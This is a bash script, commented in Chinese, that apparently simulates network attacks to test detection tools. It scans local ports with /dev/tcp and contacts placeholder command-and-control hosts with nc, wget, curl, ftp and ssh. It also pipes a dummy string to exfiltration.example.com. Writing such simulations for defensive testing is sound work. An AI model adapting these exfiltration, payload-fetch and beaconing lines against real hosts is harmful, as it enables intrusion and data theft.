#!/bin/bash

# 网络攻击模拟 - 端口扫描和异常连接
# ⚠️ 仅用于测试！

echo "🔴 模拟网络攻击"
echo "================================"

echo "1. 模拟端口扫描..."
# 扫描本地端口（安全）
for port in 22 23 80 135 139 443 445 3389 4444 5555 6666; do
    timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "端口 $port 开放" || echo "端口 $port 关闭"
done

echo ""
echo "2. 模拟异常外联..."
# 尝试连接常见的 C&C 端口
for target in "malicious.example.com" "c2.badsite.com" "evil.attacker.net"; do
    for port in 4444 5555 6666 7777 8888 9999; do
        echo "尝试连接 $target:$port"
        timeout 1 nc -w 1 $target $port 2>/dev/null || echo "连接失败（预期）"
    done
done

echo ""
echo "3. 模拟数据传输..."
# 模拟向外发送数据
echo "sensitive_data_simulation" | timeout 1 nc -w 1 exfiltration.example.com 443 2>/dev/null || echo "数据传输失败（预期）"

echo ""
echo "4. 模拟 DNS 查询..."
nslookup malicious.example.com 2>/dev/null || echo "DNS 查询失败"
dig @8.8.8.8 evil.attacker.net 2>/dev/null || echo "DNS 查询失败"

echo ""
echo "5. 模拟网络工具使用..."
wget --timeout=1 http://malicious.example.com/payload 2>/dev/null || echo "wget 下载失败（预期）"
curl --max-time 1 http://c2.badsite.com/beacon 2>/dev/null || echo "curl 请求失败（预期）"

echo ""
echo "6. 模拟 FTP 连接..."
timeout 1 ftp malicious.example.com 2>/dev/null || echo "FTP 连接失败（预期）"

echo ""
echo "7. 模拟 SSH 连接..."
timeout 1 ssh user@compromised.example.com 2>/dev/null || echo "SSH 连接失败（预期）"

echo ""
echo "✅ 网络攻击模拟完成"
